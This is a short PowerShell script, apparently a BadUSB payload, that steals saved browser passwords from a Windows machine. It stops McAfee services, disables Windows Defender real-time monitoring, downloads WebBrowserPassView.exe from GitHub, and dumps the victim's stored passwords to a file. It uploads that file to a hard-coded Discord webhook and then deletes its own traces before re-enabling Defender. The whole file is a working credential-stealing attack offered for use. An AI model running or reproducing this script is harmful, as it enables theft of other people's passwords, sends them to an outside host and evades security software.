sc stop McShield
Stop-Service -Name "masvc"

$random = -join ((48..57) | Get-Random -Count 3 | ForEach-Object {[char]$_})

mkdir C:/Payloads
Set-MpPreference -DisableRealtimeMonitoring 1
Set-MpPreference -ExclusionPath "C:/Payloads"
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile "C:/Payloads/WebBrowserPassView.exe"

Start-Sleep -seconds 3

Set-Location C:\payloads
.\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt

Start-Sleep -seconds 15

curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1103770625807495268/HPCqKHhV5TbWTpg5VibrXPYFRqMFoOmm_HAcUAVTHef8PSz0xiEKxbCX-BvimV3fK6Y1

Start-Sleep -seconds 1

Remove-Item WebBrowserPassView.exe
Remove-Item passwords-$env:UserName$random.txt
cd..
Remove-Item payloads
Remove-Item $env:temp\passview.ps1

Set-MpPreference -DisableRealtimeMonitoring 0
exit
